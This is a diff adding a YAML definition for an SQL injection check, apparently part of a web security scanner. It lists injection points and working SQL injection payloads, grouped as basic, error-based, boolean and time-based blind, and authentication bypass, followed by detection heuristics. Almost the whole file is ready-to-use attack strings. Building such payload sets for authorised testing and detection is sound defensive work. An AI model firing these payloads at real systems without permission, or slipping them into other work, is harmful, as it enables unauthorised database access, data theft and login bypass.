@@ -1,0 +1,51 @@
+id: sqli
+name: SQL Injection
+severity_range: [high, critical]
+
+injection_points:
+  - url_parameters
+  - form_inputs
+  - http_headers
+  - cookies
+  - json_values
+
+payloads:
+  basic:
+    - "' OR '1'='1"
+    - "' OR '1'='1' --"
+    - "1' ORDER BY 1--+"
+    - "1' ORDER BY 2--+"
+    - "1' ORDER BY 3--+"
+    - "1' UNION SELECT NULL--"
+    - "1' UNION SELECT NULL,NULL--"
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+
+  error_based:
+    - "' AND extractvalue(1,concat(0x7e,version()))--"
+    - "' AND updatexml(1,concat(0x7e,version()),1)--"
+    - "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+
+  blind_boolean:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' AND substring(version(),1,1)='5'--"
+
+  blind_time:
+    - "' AND SLEEP(5)--"
+    - "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "' AND pg_sleep(5)--"
+
+  auth_bypass:
+    - "admin'--"
+    - "' OR 1=1--"
+    - "') OR ('1'='1"
+    - "admin' #"
+    - "' OR 1=1 #"
+
+detection:
+  error_based: "SQL error message in response (syntax error, ORA-, mysql_)"
+  boolean_blind: "different response for TRUE vs FALSE conditions"
+  time_blind: "measurable delay difference with SLEEP/WAITFOR"
+  union_based: "additional data returned via UNION SELECT"
